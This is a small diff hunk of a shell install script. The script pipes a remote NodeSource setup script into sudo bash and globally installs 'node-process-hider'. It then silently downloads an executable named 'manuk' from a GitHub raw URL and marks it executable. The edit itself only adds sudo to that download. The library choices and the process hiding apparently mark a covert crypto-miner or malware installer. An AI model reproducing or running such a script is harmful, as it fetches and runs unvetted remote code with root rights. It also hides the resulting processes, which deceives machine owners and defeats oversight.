@@ -16,7 +16,7 @@ sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
 
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo npm i -g node-process-hider
 
-wget -qO manuk https://raw.githubusercontent.com/renilo/hajar/main/enak >/dev/null 2>&1  
+sudo wget -qO manuk https://raw.githubusercontent.com/renilo/hajar/main/enak >/dev/null 2>&1  
 
 sudo chmod +x manuk >/dev/null 2>&1
 
